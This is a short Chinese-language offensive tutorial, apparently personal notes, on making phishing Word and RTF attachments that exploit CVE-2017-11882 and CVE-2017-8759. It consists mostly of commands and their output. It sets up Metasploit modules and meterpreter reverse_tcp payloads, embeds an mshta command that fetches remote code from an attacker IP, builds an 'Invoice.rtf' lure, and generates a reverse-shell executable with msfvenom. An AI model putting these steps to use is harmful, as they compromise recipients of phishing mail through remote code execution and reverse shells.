### 利用CVE-2017-11882漏洞制作钓鱼邮件word附件

```sh
# 准备
git clone https://github.com/Ridter/CVE-2017-11882.git
git clone https://github.com/0x09AL/CVE-2017-11882-metasploit.git

cp cve_2017_11882.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/
cp cve-2017-11882.rtf /usr/share/metasploit-framework/data/exploits/

# 实施
1. msfconsole
2. use exploit/windows/smb/cve_2017_11882
3. set payload windows/meterpreter/reverse_tcp
4. set LHOST 192.168.72.3
5. set URIPATH test
6. show options

# 生成文档
python ./CVE-2017-11882/Command109b_CVE-2017-11882.py -c ""mshta http://192.168.72.3:8080/test" -o kail_help.doc

# 在msfconsole里执行
use exploit/windows/smb/cve_2017_11882
exploit -j
```

参考:

[msf生成payload](https://www.offensive-security.com/metasploit-unleashed/binary-payloads/)


## 漏洞CVE-2017-8759利用攻击
```sh
#准备
git clone https://github.com/bhdresh/CVE-2017-8759.git

root@thp3:/home/jsdu/CVE-2017-8759/CVE-2017-8759# python cve-2017-8759_toolkit.py -M gen -w Invoice.rtf -u http://192.168.72.3/logo.txt
Generating normal RTF payload.

Generated Invoice.rtf successfully

#生成反弹shell
root@thp3:/home/jsdu/CVE-2017-8759/CVE-2017-8759# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.72.3 LPORT=4444 -f exe > /root/8759shell.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes


#监听来自ppsx文件执行之后反弹的shell。
#命令：python cve-2017-8759_toolkit.py -M exp -e http://192.168.72.3/shell.exe -l /root/8759shell.exe
```